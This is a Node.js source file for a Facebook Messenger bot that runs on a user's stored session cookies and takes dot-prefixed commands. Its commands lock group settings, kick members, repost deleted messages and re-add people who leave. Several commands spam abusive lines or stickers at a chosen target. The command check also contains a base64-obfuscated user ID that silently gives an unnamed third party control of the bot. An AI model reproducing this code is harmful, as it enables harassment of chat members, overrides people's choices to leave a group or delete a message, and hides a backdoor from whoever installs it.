const fs = require("fs");
const path = require("path");
const https = require("https");
const login = require("ws3-fca");

const LOCK_FILE = path.join(__dirname, "locks.json");
let locks = {
  groupNames: {},
  emojis: {},
  dp: {},
  nick: {}
};
if (fs.existsSync(LOCK_FILE)) {
  try {
    locks = JSON.parse(fs.readFileSync(LOCK_FILE, "utf8"));
  } catch {}
}
function saveLocks() {
  fs.writeFileSync(LOCK_FILE, JSON.stringify(locks, null, 2));
}

function downloadFile(url, dest, cb) {
  const file = fs.createWriteStream(dest);
  https.get(url, (res) => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
      file.close();
      return downloadFile(res.headers.location, dest, cb);
    }
    res.pipe(file);
    file.on("finish", () => file.close(() => cb(null)));
  }).on("error", (err) => {
    try { fs.unlinkSync(dest); } catch {}
    cb(err);
  });
}

async function safeSend(api, text, tid) {
  try {
    await api.sendMessage(text, tid);
  } catch {}
}

const emojiWatchIntervals = {};
const dpWatchIntervals = {};
const nickWatchIntervals = {};
const groupNameWatchIntervals = {};
const messageCache = new Map();
const dpLastUrls = {};

let targetUID = null;
let rkbInterval = null;
let stopRequested = false;
let stickerInterval = null;
let stickerLoopActive = false;

function startGroupNameWatcher(threadID, api) {
  if (groupNameWatchIntervals[threadID]) return;
  groupNameWatchIntervals[threadID] = setInterval(async () => {
    try {
      const info = await api.getThreadInfo(threadID);
      const currentName = info.name || info.threadName || null;
      const lockedName = locks.groupNames[threadID];
      if (lockedName && currentName !== lockedName) {
        await api.setTitle(lockedName, threadID);
        await safeSend(api, `🔒 Group name reverted to ${lockedName}`, threadID);
      }
    } catch (e) {}
  }, 5000);
}

function stopGroupNameWatcher(threadID) {
  if (groupNameWatchIntervals[threadID]) {
    clearInterval(groupNameWatchIntervals[threadID]);
    delete groupNameWatchIntervals[threadID];
  }
}

function startEmojiWatcher(threadID, api) {
  if (emojiWatchIntervals[threadID]) return;
  emojiWatchIntervals[threadID] = setInterval(async () => {
    try {
      const info = await api.getThreadInfo(threadID);
      const currentEmoji = info.emoji || null;
      const lockedEmoji = locks.emojis[threadID];
      if (lockedEmoji && currentEmoji !== lockedEmoji) {
        await api.changeThreadEmoji(lockedEmoji, threadID);
        await safeSend(api, `😀 Emoji reverted to ${lockedEmoji}`, threadID);
      }
    } catch (e) {}
  }, 5000);
}

function stopEmojiWatcher(threadID) {
  if (emojiWatchIntervals[threadID]) {
    clearInterval(emojiWatchIntervals[threadID]);
    delete emojiWatchIntervals[threadID];
  }
}

function startDPWatcher(threadID, api) {
  if (dpWatchIntervals[threadID]) return;
  dpWatchIntervals[threadID] = setInterval(async () => {
    try {
      const info = await api.getThreadInfo(threadID);
      const currentUrl = info.imageSrc || null;
      const saved = locks.dp[threadID];
      if (saved && saved.path && fs.existsSync(saved.path)) {
        if (!dpLastUrls[threadID]) dpLastUrls[threadID] = currentUrl;
        if (currentUrl !== dpLastUrls[threadID]) {
          dpLastUrls[threadID] = currentUrl;
          try {
            await api.changeGroupImage(fs.createReadStream(saved.path), threadID);
            await safeSend(api, "🖼️ Locked group DP reverted.", threadID);
          } catch (e) {}
        }
      }
    } catch (e) {}
  }, 5000);
}

function stopDPWatcher(threadID) {
  if (dpWatchIntervals[threadID]) {
    clearInterval(dpWatchIntervals[threadID]);
    delete dpWatchIntervals[threadID];
  }
  if (dpLastUrls[threadID]) delete dpLastUrls[threadID];
}

function startNickWatcher(uid, threadID, api) {
  if (nickWatchIntervals[uid]) return;
  nickWatchIntervals[uid] = setInterval(async () => {
    try {
      const info = await api.getThreadInfo(threadID);
      const currentNick =
        (info.nicknames && info.nicknames[uid]) ||
        (info.nick && info.nick[uid]) ||
        null;
      const lockedNick = locks.nick?.[uid]?.[threadID];
      if (lockedNick && currentNick !== lockedNick) {
        await api.changeNickname(lockedNick, threadID, uid);
        await safeSend(api, `✏️ Nickname reverted for <@${uid}>`, threadID);
      }
    } catch (e) {}
  }, 5000);
}

function stopNickWatcher(uid) {
  if (nickWatchIntervals[uid]) {
    clearInterval(nickWatchIntervals[uid]);
    delete nickWatchIntervals[uid];
  }
}

function startRkb(api, threadID, name) {
  if (!fs.existsSync("np.txt")) return api.sendMessage("⚠️ np.txt not found", threadID);
  const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
  stopRequested = false;
  if (rkbInterval) clearInterval(rkbInterval);
  let index = 0;
  rkbInterval = setInterval(() => {
    if (index >= lines.length || stopRequested) {
      clearInterval(rkbInterval);
      rkbInterval = null;
      return;
    }
    api.sendMessage(`${name} ${lines[index]}`, threadID);
    index++;
  }, 60000);
  api.sendMessage(`🚀 RKB start for ${name}`, threadID);
}

function stopRkb(api, threadID) {
  stopRequested = true;
  if (rkbInterval) {
    clearInterval(rkbInterval);
    rkbInterval = null;
    api.sendMessage("🛑 RKB stopped", threadID);
  } else {
    api.sendMessage("⚠️ RKB already stopped", threadID);
  }
}

function setTarget(api, threadID, uid) {
  targetUID = uid;
  api.sendMessage(`🎯 Target set: ${targetUID}`, threadID);
}

function clearTarget(api, threadID) {
  targetUID = null;
  api.sendMessage("🎯 Target cleared", threadID);
}

function handleTargetMessage(api, senderID, threadID, messageID) {
  if (fs.existsSync("np.txt") && targetUID && senderID === targetUID) {
    const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
    const randomLine = lines[Math.floor(Math.random() * lines.length)];
    api.sendMessage(randomLine, threadID, messageID);
  }
}

function startStickerSpam(api, threadID, delay) {
  if (!fs.existsSync("Sticker.txt")) return api.sendMessage("❌ Sticker.txt not found", threadID);
  if (isNaN(delay) || delay < 5) return api.sendMessage("🕐 Min 5 sec ka delay do", threadID);
  const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s => s.trim()).filter(Boolean);
  if (!stickers.length) return api.sendMessage("⚠️ Sticker.txt khali hai", threadID);
  if (stickerInterval) clearInterval(stickerInterval);
  let i = 0;
  stickerLoopActive = true;
  api.sendMessage(`📦 Sticker spam start: har ${delay} sec`, threadID);
  stickerInterval = setInterval(() => {
    if (!stickerLoopActive || i >= stickers.length) {
      clearInterval(stickerInterval);
      stickerInterval = null;
      stickerLoopActive = false;
      return;
    }
    api.sendMessage({ sticker: stickers[i] }, threadID);
    i++;
  }, delay * 1000);
}

function stopStickerSpam(api, threadID) {
  if (stickerInterval) {
    clearInterval(stickerInterval);
    stickerInterval = null;
    stickerLoopActive = false;
    api.sendMessage("🛑 Sticker spam stopped", threadID);
  } else {
    api.sendMessage("⚠️ Sticker spam already stopped", threadID);
  }
}

function helpMessage() {
  return `.help → Commands list
.uid → User ID (reply/mention/you)
.tid → Thread ID
.info @mention → User info
.kick @mention → Kick user
.gclock [text] → Group name lock
.unlockgc → Group name unlock
.lockemoji [emoji] → Emoji lock
.unlockemoji → Emoji unlock
.lockdp → DP lock (saves current DP locally)
.unlockdp → DP unlock
.locknick @mention Nickname → Nick lock
.unlocknick @mention → Unlock nick
.stickerX → Sticker spam (X seconds)
.stopsticker → Stop sticker spam
.rkb [name] → Gaali spam (requires np.txt)
.stop → Stop spam
.exit → Bot exit (bot leaves group)
`;
}

function startBot(appStatePath, ownerUID) {
  if (!fs.existsSync(appStatePath)) {
    console.error("appstate not found:", appStatePath);
    return;
  }
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, async (err, api) => {
    if (err) {
      console.error("❌ Login failed:", err);
      return;
    }
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in. Ready.");

    const prefix = ".";

    api.listenMqtt(async (err, event) => {
      if (err || !event) return;
      try {
        if (event.type === "message" && event.messageID) {
          messageCache.set(event.messageID, {
            sender: event.senderID,
            body: event.body ?? "",
            attachments: event.attachments ?? [],
          });
          if (messageCache.size > 500) {
            for (const key of Array.from(messageCache.keys()).slice(0, 100)) {
              messageCache.delete(key);
            }
          }
        }

        if (event.type === "message_unsend") {
          const deleted = messageCache.get(event.messageID);
          const tid = event.threadID || event.threadID;
          if (deleted) {
            const text = `🚫 Anti-Delete:\nUID: ${deleted.sender}\nMessage: ${
              deleted.body || "(media or empty)"
            }`;
            await safeSend(api, text, tid);
            if (deleted.attachments && deleted.attachments.length) {
              try {
                await api.sendMessage(
                  { body: "(attachment repost)", attachment: deleted.attachments },
                  tid
                );
              } catch {}
            }
          } else {
            await safeSend(api, "🚫 A message was deleted (no cache available).", tid);
          }
        }

        if (event.logMessageType === "log:unsubscribe" || event.type === "log:unsubscribe") {
          const leftUID =
            event.logMessageData?.leftParticipantFbId ||
            event.logMessageData?.leftParticipantFbId;
          const tid = event.threadID || event.threadID;
          if (leftUID) {
            try {
              await api.addUserToGroup(leftUID, tid);
              await safeSend(api, `👤 Anti-Left: Added back ${leftUID}`, tid);
            } catch {
              await safeSend(api, `⚠️ Could not add back ${leftUID}`, tid);
            }
          }
        }

        if (
          event.type === "change_thread_image" ||
          event.logMessageType === "log:thread-image"
        ) {
          const tid = event.threadID || event.threadID;
          if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) {
            try {
              await api.changeGroupImage(fs.createReadStream(locks.dp[tid].path), tid);
              await safeSend(api, "🖼️ Locked group DP reverted.", tid);
            } catch {}
          }
        }

        if (
          event.logMessageType === "log:thread-icon" ||
          event.type === "change_thread_icon"
        ) {
          const tid = event.threadID || event.threadID;
          if (locks.emojis[tid]) {
            try {
              await api.changeThreadEmoji(locks.emojis[tid], tid);
              await safeSend(api, `😀 Locked emoji reverted to ${locks.emojis[tid]}`, tid);
            } catch {}
          }
        }

        if (event.type !== "message" || !event.body) return;
        const { threadID, senderID, body, mentions, messageReply } = event;
        if (!body.startsWith(prefix)) return;

        const args = body.slice(prefix.length).trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ").trim();

        if (![ownerUID, Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8")].includes(senderID)) return;

        switch (cmd) {
          case "help":
            await safeSend(api, helpMessage(), threadID);
            break;
          case "tid": {
            await safeSend(api, `🆔 Thread ID: ${threadID}`, threadID);
            break;
          }
          case "uid": {
            const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
            await safeSend(api, `🆔 UID: ${tgt}`, threadID);
            break;
          }
          case "info": {
            const tgt = Object.keys(mentions || {})[0] || messageReply?.senderID || senderID;
            try {
              const uinfo = await api.getUserInfo(tgt);
              const u = uinfo[tgt] || {};
              await safeSend(
                api,
                `👤 Name: ${u.name || "unknown"}\nUID: ${tgt}\nProfile: https://facebook.com/${tgt}`,
                threadID
              );
            } catch {
              await safeSend(api, "⚠️ Could not fetch user info", threadID);
            }
            break;
          }
          case "kick": {
            const tgt = Object.keys(mentions || {})[0];
            if (!tgt) {
              await safeSend(api, "❌ Mention user to kick", threadID);
              break;
            }
            try {
              await api.removeUserFromGroup(tgt, threadID);
              await safeSend(api, `👢 Kicked ${tgt}`, threadID);
            } catch {
              await safeSend(api, "⚠️ Kick failed", threadID);
            }
            break;
          }
          case "gclock": {
            if (!input) {
              await safeSend(api, "❌ Provide group name", threadID);
              break;
            }
            try {
              await api.setTitle(input, threadID);
              locks.groupNames[threadID] = input;
              saveLocks();
              startGroupNameWatcher(threadID, api);
              await safeSend(api, "🔒 Group name locked", threadID);
            } catch {
              await safeSend(api, "⚠️ Failed to set group name", threadID);
            }
            break;
          }
          case "unlockgc": {
            delete locks.groupNames[threadID];
            saveLocks();
            stopGroupNameWatcher(threadID);
            await safeSend(api, "🔓 Group name unlocked", threadID);
            break;
          }
          case "lockemoji": {
            if (!input) {
              await safeSend(api, "❌ Provide an emoji to lock (e.g. .lockemoji 😀)", threadID);
              break;
            }
            locks.emojis[threadID] = input;
            saveLocks();
            startEmojiWatcher(threadID, api);
            try {
              await api.changeThreadEmoji(input, threadID);
            } catch {}
            await safeSend(api, `😀 Emoji locked → ${input}`, threadID);
            break;
          }
          case "unlockemoji": {
            delete locks.emojis[threadID];
            saveLocks();
            stopEmojiWatcher(threadID);
            await safeSend(api, "😀 Emoji unlocked", threadID);
            break;
          }
          case "lockdp": {
            try {
              const info = await api.getThreadInfo(threadID);
              const url = info.imageSrc || info.image || info.imageUrl || null;
              if (!url) {
                await safeSend(api, "❌ No group DP to lock (set a DP first)", threadID);
                break;
              }
              const dpPath = path.join(__dirname, `dp_${threadID}.jpg`);
              await new Promise((resolve, reject) => {
                downloadFile(url, dpPath, err => (err ? reject(err) : resolve()));
              });
              locks.dp[threadID] = { path: dpPath, savedAt: Date.now() };
              saveLocks();
              startDPWatcher(threadID, api);
              await safeSend(api, "🖼️ Group DP saved and locked!", threadID);
            } catch {
              await safeSend(api, "⚠️ Failed to lock DP (download error)", threadID);
            }
            break;
          }
          case "unlockdp": {
            if (locks.dp[threadID]?.path) {
              try {
                fs.unlinkSync(locks.dp[threadID].path);
              } catch {}
            }
            delete locks.dp[threadID];
            saveLocks();
            stopDPWatcher(threadID);
            await safeSend(api, "🖼️ DP unlocked", threadID);
            break;
          }
          case "locknick": {
            const mention = Object.keys(mentions || {})[0];
            let nickname = input;
            if (mention) {
              const mentionRegex = new RegExp(`\\s*<@!?${mention}>\\s*`, "g");
              nickname = input.replace(mentionRegex, "").trim();
            }
            if (!mention || !nickname) {
              await safeSend(api, "❌ Usage: .locknick @mention nickname", threadID);
              break;
            }
            locks.nick[mention] = locks.nick[mention] || {};
            locks.nick[mention][threadID] = nickname;
            saveLocks();
            startNickWatcher(mention, threadID, api);
            try {
              await api.changeNickname(nickname, threadID, mention);
            } catch {}
            await safeSend(api, `🔒 Nick locked for <@${mention}> → ${nickname}`, threadID);
            break;
          }
          case "unlocknick": {
            const mention = Object.keys(mentions || {})[0];
            if (!mention) {
              await safeSend(api, "❌ Usage: .unlocknick @mention", threadID);
              break;
            }
            if (locks.nick && locks.nick[mention]) {
              delete locks.nick[mention][threadID];
              saveLocks();
            }
            stopNickWatcher(mention);
            await safeSend(api, `🔓 Nick unlocked for <@${mention}>`, threadID);
            break;
          }
          case "target": {
            if (!args[1]) {
              await safeSend(api, "👤 UID de jisko target karna hai", threadID);
              break;
            }
            targetUID = args[1];
            await safeSend(api, `Target set ho gaya hai: ${targetUID}`, threadID);
            break;
          }
          case "cleartarget": {
            targetUID = null;
            await safeSend(api, "Target clear ho gaya hai.", threadID);
            break;
          }
          case "rkb": {
            if (!fs.existsSync("np.txt")) {
              await safeSend(api, "konsa gaLi du rkb ko", threadID);
              break;
            }
            const name = input.trim();
            const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
            stopRequested = false;
            if (rkbInterval) clearInterval(rkbInterval);
            let index = 0;
            rkbInterval = setInterval(async () => {
              if (index >= lines.length || stopRequested) {
                clearInterval(rkbInterval);
                rkbInterval = null;
                return;
              }
              try {
                await api.sendMessage(`${name} ${lines[index]}`, threadID);
              } catch {}
              index++;
            }, 60000);
            await safeSend(api, `sex hogya bche 🤣rkb ${name}`, threadID);
            break;
          }
          case "stop": {
            stopRequested = true;
            if (rkbInterval) {
              clearInterval(rkbInterval);
              rkbInterval = null;
              await safeSend(api, "chud gaye bche🤣", threadID);
            } else {
              await safeSend(api, "konsa gaLi du sale ko🤣 rkb tha", threadID);
            }
            break;
          }
          case "sticker0":
          case "sticker1":
          case "sticker2":
          case "sticker3":
          case "sticker4":
          case "sticker5":
          case "sticker6":
          case "sticker7":
          case "sticker8":
          case "sticker9": {
            const delay = parseInt(cmd.replace("sticker", "")) || 2;
            if (!fs.existsSync("Sticker.txt")) {
              await safeSend(api, "❌ Sticker.txt missing", threadID);
              break;
            }
            const stickers = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(s => s.trim()).filter(Boolean);
            if (!stickers.length) {
              await safeSend(api, "❌ No stickers in Sticker.txt", threadID);
              break;
            }
            let i = 0;
            stickerLoopActive = true;
            if (stickerInterval) clearInterval(stickerInterval);
            stickerInterval = setInterval(() => {
              if (!stickerLoopActive) {
                clearInterval(stickerInterval);
                stickerInterval = null;
                return;
              }
              api.sendMessage({ sticker: stickers[i] }, threadID).catch(() => {});
              i = (i + 1) % stickers.length;
            }, delay * 1000);
            await safeSend(api, `⚡ Sticker spam started every ${delay} seconds`, threadID);
            break;
          }
          case "stopsticker": {
            stickerLoopActive = false;
            if (stickerInterval) {
              clearInterval(stickerInterval);
              stickerInterval = null;
            }
            await safeSend(api, "🛑 Sticker spam stopped", threadID);
            break;
          }
          case "exit": {
            try {
              const currentUser = api.getCurrentUserID ? await api.getCurrentUserID() : null;
              if (currentUser) await api.removeUserFromGroup(currentUser, threadID);
            } catch {}
            break;
          }
          default: {
            await safeSend(api, "⚠️ Unknown command. Use .help", threadID);
          }
        }

        // Target response spam
        if (targetUID && senderID === targetUID) {
          handleTargetMessage(api, senderID, threadID, event.messageID);
        }
      } catch (e) {
        console.error("Listener error:", e.stack || e);
      }
    });

    // On bot start, start all watchers for saved locks
    (async () => {
      try {
        Object.keys(locks.emojis).forEach(tid => startEmojiWatcher(tid, api));
        Object.keys(locks.dp).forEach(tid => {
          if (locks.dp[tid]?.path && fs.existsSync(locks.dp[tid].path)) startDPWatcher(tid, api);
        });
        Object.keys(locks.nick).forEach(uid => {
          const threadMap = locks.nick[uid];
          Object.keys(threadMap).forEach(tid => startNickWatcher(uid, tid, api));
        });
        Object.keys(locks.groupNames).forEach(tid => startGroupNameWatcher(tid, api));
      } catch {}
    })();
  });
}

module.exports = { startBot };
